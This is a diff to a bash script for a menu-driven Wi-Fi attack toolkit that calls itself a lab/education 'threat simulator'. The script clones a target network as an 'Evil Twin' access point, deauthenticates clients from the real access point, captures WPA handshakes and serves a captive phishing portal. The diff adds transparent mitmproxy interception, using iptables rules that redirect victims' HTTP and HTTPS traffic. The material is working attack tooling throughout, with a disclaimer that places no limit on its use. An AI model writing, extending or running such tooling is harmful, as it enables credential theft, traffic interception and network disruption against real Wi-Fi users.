@@ -14,21 +14,23 @@ DNS_CONF="configs/dnsmasq.conf"
 PHISH_PORTAL="phishing_portal"
 SKINS_DIR="$PHISH_PORTAL/skins"
 LOGDIR="logs"
+MITM_LOG="logs/mitmproxy.log"
+MITMSTATE="off"
 [ -d "$LOGDIR" ] || mkdir -p "$LOGDIR"
 [ -d "$SKINS_DIR" ] || mkdir -p "$SKINS_DIR"
 
 function cleanup() {
-    echo -e "${CYAN}[*] Cleaning up: Killing processes and resetting network${NC}"
     sudo pkill hostapd || true
     sudo pkill dnsmasq || true
     sudo pkill airodump-ng || true
     sudo pkill aireplay-ng || true
     sudo pkill -f "python3 $PHISH_PORTAL/server.py" || true
+    sudo pkill -f mitmproxy || true
     sudo iptables -F
     sudo iptables -t nat -F
     sudo systemctl restart NetworkManager || sudo service network-manager restart
     [ -n "$IFACE" ] && sudo ip link set "$IFACE" down 2>/dev/null || true
-    echo -e "${GREEN}[✓] Teardown complete.${NC}"
+    echo -e "${GREEN}[✓] Reset complete.${NC}"
 }
 
 trap cleanup EXIT
@@ -40,8 +42,8 @@ function banner() {
     echo " |_ _|| \| | __| \| | |    /_\  _ _| |_ ___| |___  | |___ ___ "
     echo "  | | | .\` | _|| .\` | |__ / _ \\| ' \\  _/ _ \\ / -_) | / -_|_-/"
     echo " |___||_|\\_|___|_|\\_|____/_/ \\_||_|\\__\\___/_\\___| |_\\___/__|"
-    echo -e "${CYAN}    Wi-Fi Threat Simulator - For Lab/Education only ${NC}"
-    echo ""
+    echo -e "${CYAN}    Wi-Fi Threat Simulator - For Lab/Education only ${NC}\n"
+    echo -e "${YELLOW}MITM Status: $MITMSTATE${NC}\n"
 }
 
 function prompt_iface(){
@@ -80,7 +82,6 @@ wpa_passphrase=$FAKEPASS
 wpa_key_mgmt=WPA-PSK
 rsn_pairwise=CCMP
 EOF
-
     cat > "$DNS_CONF" <<EOF
 interface=$IFACE
 dhcp-range=10.0.0.10,10.0.0.250,12h
@@ -96,24 +97,18 @@ function start_rogue_ap(){
     read -p "SSID to Clone (target): " FAKESSID
     read -p "Channel (e.g. 6): " CHANNEL
     read -p "Set WPA2 Key (fake, for realism): " FAKEPASS
-
-    echo -e "${YELLOW}[!] Setting up interface $IFACE, assigning 10.0.0.1${NC}"
     sudo ip link set "$IFACE" down
     sudo ip addr flush dev "$IFACE"
     sudo ip link set "$IFACE" up
     sudo ip addr add 10.0.0.1/24 dev "$IFACE"
     sudo pkill hostapd || true
     gen_configs
-
-    echo -e "${CYAN}[*] Starting rogue hostapd (fake AP)... (/tmp/hostapd.log)${NC}"
     sudo hostapd "$AP_CONF" > /tmp/hostapd.log 2>&1 &
     sleep 2
-
-    echo -e "${CYAN}[*] Starting DHCP+DNS... (/tmp/dnsmasq.log)${NC}"
     sudo dnsmasq -C "$DNS_CONF" > /tmp/dnsmasq.log 2>&1 &
     sudo iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE 2>/dev/null || true
     sudo iptables -A FORWARD -i "$IFACE" -j ACCEPT 2>/dev/null || true
-    echo -e "${GREEN}[+] Evil Twin running, captive portal on 10.0.0.1${NC}"
+    echo -e "${GREEN}[+] Evil Twin running on 10.0.0.1${NC}"
 }
 
 function deauth_attack() {
@@ -123,10 +118,9 @@ function deauth_attack() {
     sudo ip link set "$IFACE" down
     sudo iw "$IFACE" set monitor control
     sudo ip link set "$IFACE" up
-    echo -e "${CYAN}[*] Scanning with airodump-ng (ctrl+c to stop as soon as you see clients)...${NC}"
     sudo airodump-ng -c "$CH" --bssid "$BSSID" "$IFACE"
-    echo -e "${YELLOW}[!] Enter STATION MAC (client MAC) for targeted deauth, or leave empty to broadcast to all:${NC}"
-    read -p "Victim STATION MAC (leave empty for broadcast): " STATION
+    echo -e "${YELLOW}[!] Enter STATION MAC (or leave empty for broadcast):${NC}"
+    read -p "Station: " STATION
     if [ -z "$STATION" ]; then
         sudo aireplay-ng --deauth 25 -a "$BSSID" "$IFACE"
     else
@@ -140,7 +134,6 @@ function handshake_capture() {
     read -p "Channel: " CH
     TS=$(date +%Y%m%d_%H%M%S)
     OUTFILE="$LOGDIR/handshake_$TS"
-    echo -e "${CYAN}[*] Capturing handshakes (ctrl+c when handshake appears) (output: $OUTFILE.cap)${NC}"
     sudo airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUTFILE" "$IFACE"
 }
 
@@ -172,17 +165,45 @@ function phishing_portal() {
     pkill -f "python3 server.py"
 }
 
+function start_mitmproxy() {
+    [ "$MITMSTATE" = "on" ] && echo -e "${YELLOW}[!] MITMProxy already running!${NC}" && return
+    read -p "MITMProxy ui or cli? [ui/cli]: " mode
+    if [ "$mode" = "ui" ]; then
+        sudo mitmweb --mode transparent --showhost --listen-port 8080 > "$MITM_LOG" 2>&1 &
+    else
+        sudo mitmproxy --mode transparent --showhost --listen-port 8080 > "$MITM_LOG" 2>&1 &
+    fi
+    sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080
+    sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080
+    MITMSTATE="on"
+    echo -e "${GREEN}[+] MITMProxy enabled. Logs at $MITM_LOG.${NC}"
+}
+
+function stop_mitmproxy() {
+    sudo pkill -f mitmproxy || true
+    sudo pkill -f mitmweb || true
+    sudo iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 || true
+    sudo iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080 || true
+    MITMSTATE="off"
+    echo -e "${GREEN}[+] MITMProxy stopped.${NC}"
+}
+
 while true; do
     banner
     echo -e "${BLUE}1) Scan WiFi interfaces & networks${NC}"
     echo -e "${BLUE}2) Start Rogue AP (Evil Twin)${NC}"
     echo -e "${BLUE}3) Deauth client(s) from real AP${NC}"
-    echo -e "${BLUE}4) Capture WPA Handshake (.cap)${NC}"
+    echo -e "${BLUE}4) Capture WPA Handshake${NC}"
     echo -e "${BLUE}5) Choose phishing portal skin${NC}"
     echo -e "${BLUE}6) Launch Captive Phishing Portal${NC}"
-    echo -e "${BLUE}7) SAFE TEARDOWN/RESET${NC}"
-    echo -e "${BLUE}8) Exit${NC}"
-    echo -ne "${CYAN}Your choice [1-8]: ${NC}"; read CHOICE
+    if [ "$MITMSTATE" = "on" ]; then
+        echo -e "${YELLOW}7) Stop MITMProxy + logs${NC}"
+    else
+        echo -e "${BLUE}7) Launch MITMProxy (sniff/intercept)${NC}"
+    fi
+    echo -e "${BLUE}8) SAFE TEARDOWN/RESET${NC}"
+    echo -e "${BLUE}9) Exit${NC}"
+    echo -ne "${CYAN}Your choice [1-9]: ${NC}"; read CHOICE
     case $CHOICE in
         1) scan_wifi_interfaces_and_networks ;;
         2) start_rogue_ap ;;
@@ -190,8 +211,9 @@ while true; do
         4) handshake_capture ;;
         5) select_portal_skin ;;
         6) phishing_portal ;;
-        7) cleanup ;;
-        8) echo -e "${GREEN}Bye!${NC}"; exit 0 ;;
+        7) if [ "$MITMSTATE" = "off" ]; then start_mitmproxy; else stop_mitmproxy; fi ;;
+        8) cleanup ;;
+        9) echo -e "${GREEN}Bye!${NC}"; exit 0 ;;
         *) echo -e "${RED}[!] Invalid option.${NC}" ;;
     esac
     read -p "Press Enter to return to menu..."
